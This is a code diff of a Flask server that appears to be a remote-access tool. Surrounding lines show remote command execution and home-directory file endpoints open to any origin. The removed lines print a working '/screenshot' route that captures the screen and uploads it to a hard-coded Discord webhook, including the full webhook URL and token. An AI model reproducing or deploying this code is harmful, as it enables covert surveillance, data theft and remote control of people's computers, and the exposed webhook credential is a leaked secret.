@@ -3,7 +3,6 @@ import subprocess
 from flask import Flask, request, jsonify, send_from_directory, render_template_string, Response
 import os
 from PIL import ImageGrab
-import requests
 from flask_cors import CORS
 import time
 import cv2
@@ -13,7 +12,6 @@ import ctypes
 app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS"], "allow_headers": "*"}})
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1314775003081871430/X3xBhkQ0K6ISb-mGpE4R-1yjfKlq-UEsdejT4CeF3RjBjcz5zGe-bGqq_wt_qtkWdj5x"
 BASE_DIRECTORY = os.path.expanduser("~")
 
 import tkinter as tk
@@ -269,28 +267,6 @@ def run_command():
         }), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
-
-@app.route('/screenshot', methods=['POST'])
-def send_screenshot():
-    try:
-        downloads_dir = os.path.join(BASE_DIRECTORY, "Downloads")
-        os.makedirs(downloads_dir, exist_ok=True)
-
-        screenshot_path = os.path.join(downloads_dir, "screenshot.png")
-        screenshot = ImageGrab.grab()
-        screenshot.save(screenshot_path)
-
-        with open(screenshot_path, "rb") as f:
-            response = requests.post(WEBHOOK_URL, files={"file": f})
-
-        os.remove(screenshot_path)
-
-        if response.status_code == 200:
-            return "Screenshot sent successfully!"
-        else:
-            return f"Failed to send screenshot. Status code: {response.status_code}", 500
-    except Exception as e:
-        return f"Error capturing screenshot: {e}", 500
 
 
 @app.route('/files', methods=['GET', 'POST'])
